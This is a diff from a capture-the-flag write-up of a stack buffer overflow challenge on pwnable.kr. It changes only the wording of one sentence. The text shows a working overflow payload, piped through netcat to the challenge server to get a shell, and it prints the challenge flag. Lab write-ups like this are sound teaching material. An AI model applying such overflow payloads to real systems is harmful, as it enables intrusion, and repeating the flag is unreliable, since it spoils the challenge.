@@ -101,7 +101,7 @@ Classic buffer overflow question. In the assembly we see that `$ebp-0x2c` is set
 
 We accomplish this with the following payload: `python -c "print 'A'*52+'\xbe\xba\xfe\xca'"`. However, it seems the program checks for stack smashing, so what we need to do is keep STDIN open once we get our shell, cause the program only checks for stack smashing at the end of the `func` function. Because of this, we modify our payload: `(python -c "print 'A'*52+'\xbe\xba\xfe\xca'"; cat)`. 
 
-We now run `(python -c "print 'A'*52+'\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000`, see that we do indeed have a shell, then run `ls`, see the flag file, and then run `cat flag`, and get our flag.
+We now run `(python -c "print 'A'*52+'\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000`, see that we do indeed have a shell, then run `ls`, see the flag file, and then run `cat flag` to get our flag.
 
 flag: `daddy, I just pwned a buFFer :)`
 
